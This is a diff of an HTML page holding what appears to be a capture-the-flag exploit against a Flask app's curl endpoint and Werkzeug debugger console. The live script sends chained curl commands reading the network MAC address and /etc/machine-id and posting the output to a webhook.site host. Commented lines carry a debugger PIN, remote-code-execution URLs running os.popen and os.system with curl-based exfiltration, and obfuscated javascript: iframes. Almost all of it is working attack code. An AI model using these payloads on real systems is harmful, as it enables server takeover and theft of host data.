@@ -7,13 +7,13 @@
 <body>
     <img src='https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2'>
 <script>
-// (async () => {
-//     try {
-//         // 1. Send request to local Flask curl endpoint
-//         const res = await fetch("http://localhost:8001/curl", {
-//             method: "POST",
-//             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-//             body: "cmd=localhost:8001/console?__debugger__=yes\&cmd=pinauth\&pin=428-075-344\&s=fpXORGH7hJFyNGlMLUqH  | curl http://localhost:8001/console?__debugger__=yes\&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29\&frm=0\&s=fpXORGH7hJFyNGlMLUqH | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
+(async () => {
+    try {
+        // 1. Send request to local Flask curl endpoint
+        const res = await fetch("http://localhost:8001/curl", {
+            method: "POST",
+            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+            body: "cmd=file:////sys/class/net/eth0/address   | curl file:////etc/machine-id | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
 
 //             //STEP 1 /proc/net/arp
 
@@ -39,45 +39,51 @@
 
 //             //flag http://localhost:8001/console?__debugger__=yes&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29&frm=0&s=fpXORGH7hJFyNGlMLUqH
 
-//         });
-//         const data = await res.text();
+        });
+        const data = await res.text();
 
-//         // 2. Forward response to your webhook
-//         await fetch("https://webhook.site/97912302-411f-4587-b7b9-055611f6df06", {
-//             method: "POST",
-//             headers: { "Content-Type": "text/plain" },
-//             body: data
-//         });
+        // 2. Forward response to your webhook
+        await fetch("https://webhook.site/97912302-411f-4587-b7b9-055611f6df06", {
+            method: "POST",
+            headers: { "Content-Type": "text/plain" },
+            body: data
+        });
 
-//         console.log("Response forwarded successfully!");
-//     } catch (err) {
-//         console.error(err);
-//     }
-// })();
+        console.log("Response forwarded successfully!");
+    } catch (err) {
+        console.error(err);
+    }
+})();
 
 
-async function run() {
-  const urls = [
-    "http://localhost:8001/console?__debugger__=yes&cmd=pinauth&pin=428-075-344&s=fpXORGH7hJFyNGlMLUqH",
-    "http://localhost:8001/console?__debugger__=yes&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29&frm=0&s=fpXORGH7hJFyNGlMLUqH"
-  ];
+//<iframe src="javas&#13;cript:document.body.appendChild(Object.assign(document.createElement('a'),{href:'http://localhost:8001/co%6esole?__debugger__=yes&cmd=pinauth&pin=428-075-344&s=fpXORGH7hJFyNGlMLUqH',target:'_top'})).click()"></iframe>
 
-  for (const url of urls) {
-    const resp = await fetch(url, {
-      credentials: "include"   // ensures cookies/session are sent
-    });
-    const text = await resp.text();
+//<iframe src="javas&#13;cript:document.body.appendChild(Object.assign(document.createElement('a'),{href:'http://localhost:8001/co%6esole?__debugger__=yes&cmd=import+os%3Bos.system%28%27curl+https%3A%2F%2Fwebhook.site%2F97912302-411f-4587-b7b9-055611f6df06%2Fp%3D%60whoami%60%27%29&frm=0&s=fpXORGH7hJFyNGlMLUqH',target:'_top'})).click()"></iframe>
 
-    // forward the response to your webhook
-    await fetch("https://webhook.site/97912302-411f-4587-b7b9-055611f6df06", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: text
-    });
-  }
-}
+//
+//http://localhost:8001/co%6esole?__debugger__=yes&cmd=import+os%3Bos.system%28%27curl+https%3A%2F%2Fwebhook.site%2F97912302-411f-4587-b7b9-055611f6df06%2Fp%3D%60whoami%60%27%29&frm=0&s=fpXORGH7hJFyNGlMLUqH
+// async function run() {
+//   const urls = [
+//     "http://localhost:8001/console?__debugger__=yes&cmd=pinauth&pin=428-075-344&s=fpXORGH7hJFyNGlMLUqH",
+//     "http://localhost:8001/console?__debugger__=yes&cmd=import+os%3Bos.popen%28%27.%2Fflag%27%29.read%28%29&frm=0&s=fpXORGH7hJFyNGlMLUqH"
+//   ];
 
-run();
+//   for (const url of urls) {
+//     const resp = await fetch(url, {
+//       credentials: "include"   // ensures cookies/session are sent
+//     });
+//     const text = await resp.text();
+
+//     // forward the response to your webhook
+//     await fetch("https://webhook.site/97912302-411f-4587-b7b9-055611f6df06", {
+//       method: "POST",
+//       headers: { "Content-Type": "text/plain" },
+//       body: text
+//     });
+//   }
+// }
+
+// run();
 </script>
 
 </body>
